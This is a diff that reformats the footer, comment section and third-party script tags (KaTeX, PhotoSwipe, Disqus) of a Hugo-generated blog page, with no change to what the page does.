+<svg class="icon icon-tabler icon-tabler-copyright" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+<path d="M0 0h24v24H0z" stroke="none"></path>
+<circle cx="12" cy="12" r="9"></circle>
+<path d="M14.5 9a3.5 4 0 1 0 0 6"></path>
 </svg>
-
-
-
-        <span>Licensed under CC BY-NC-SA 4.0</span>
-    </section>
-    </footer>
-
-
-    
-        <link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css"integrity="sha256-J&#43;iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s="crossorigin="anonymous"
-            ><script 
-                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js"integrity="sha256-InsNdER1b2xUewP&#43;pKCUJpkhiqwHgqiPXDlIk7GzBu4="crossorigin="anonymous"
-                defer
-                >
-            </script><script 
-                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js"integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI="crossorigin="anonymous"
-                defer
-                >
-            </script><script>
+<span>Licensed under CC BY-NC-SA 4.0</span>
+</section>
+</footer>
+<link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css" integrity="sha256-J+iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s=" rel="stylesheet"/><script crossorigin="anonymous" defer="" integrity="sha256-InsNdER1b2xUewP+pKCUJpkhiqwHgqiPXDlIk7GzBu4=" src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js">
+</script><script crossorigin="anonymous" defer="" integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI=" src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js">
+</script><script>
     window.addEventListener("DOMContentLoaded", () => {
         renderMathInElement(document.querySelector(`.article-content`), {
             delimiters: [
@@ -497,18 +286,9 @@ code-signer{
             ignoredClasses: ["gist"]
         });})
 </script>
-    
 </article>
-
-    
-
-    
-
-     
-    
-        
-    <div class="disqus-container">
-    <div id="disqus_thread"></div>
+<div class="disqus-container">
+<div id="disqus_thread"></div>
 <script type="application/javascript">
     window.disqus_config = function () {
     
@@ -527,9 +307,8 @@ code-signer{
     })();
 </script>
 <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+<a class="dsq-brlink" href="https://disqus.com">comments powered by <span class="logo-disqus">Disqus</span></a>
 </div>
-
 <style>
     .disqus-container {
         background-color: var(--card-background);
@@ -538,7 +317,6 @@ code-signer{
         padding: var(--card-padding);
     }
 </style>
-
 <script>
     window.addEventListener('onColorSchemeChange', (e) => {
         if (typeof DISQUS == 'object') {
@@ -548,110 +326,61 @@ code-signer{
         }
     })
 </script>
-
-    
-
-    <footer class="site-footer">
-    <section class="copyright">
-        &copy; 
+<footer class="site-footer">
+<section class="copyright">
+        © 
         
         2023 fragrant1001
     </section>
-    
-    <section class="powerby">
+<section class="powerby">
         
             Use it or lose it... <br/>
-        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.21.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
-    </section>
+        Built with <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo</a> <br/>
+        Theme <b><a data-version="3.21.0" href="https://github.com/CaiJimmy/hugo-theme-stack" rel="noopener" target="_blank">Stack</a></b> designed by <a href="https://jimmycai.com" rel="noopener" target="_blank">Jimmy</a>
+</section>
 </footer>
-
-
-    
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-    
-    <div class="pswp__bg"></div>
-
-    
-    <div class="pswp__scroll-wrap">
-
-        
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-
-        
-        <div class="pswp__ui pswp__ui--hidden">
-
-            <div class="pswp__top-bar">
-
-                
-
-                <div class="pswp__counter"></div>
-
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-
-                
-                
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                        <div class="pswp__preloader__cut">
-                            <div class="pswp__preloader__donut"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div>
-            </div>
-
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-
-        </div>
-
-    </div>
-
-</div><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
-                defer
-                >
-            </script><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
-                defer
-                >
-            </script><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
-            ><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
-            >
-
-            </main>
-        </div>
-        <script 
-                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
-                
-                >
-            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<div aria-hidden="true" class="pswp" role="dialog" tabindex="-1">
+<div class="pswp__bg"></div>
+<div class="pswp__scroll-wrap">
+<div class="pswp__container">
+<div class="pswp__item"></div>
+<div class="pswp__item"></div>
+<div class="pswp__item"></div>
+</div>
+<div class="pswp__ui pswp__ui--hidden">
+<div class="pswp__top-bar">
+<div class="pswp__counter"></div>
+<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title="Share"></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+<div class="pswp__preloader">
+<div class="pswp__preloader__icn">
+<div class="pswp__preloader__cut">
+<div class="pswp__preloader__donut"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+<div class="pswp__share-tooltip"></div>
+</div>
+<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+</button>
+<div class="pswp__caption">
+<div class="pswp__caption__center"></div>
+</div>
+</div>
+</div>
+</div><script crossorigin="anonymous" defer="" integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js">
+</script><script crossorigin="anonymous" defer="" integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js">
+</script><link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css" rel="stylesheet"/><link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css" rel="stylesheet"/>
+</main>
+</div>
+<script crossorigin="anonymous" integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js">
+</script><script defer="" src="/ts/main.js" type="text/javascript"></script>
 <script>
     (function () {
         const customFont = document.createElement('link');
@@ -663,6 +392,5 @@ code-signer{
         document.head.appendChild(customFont);
     }());
 </script>
-
-    </body>
+</body>
 </html>
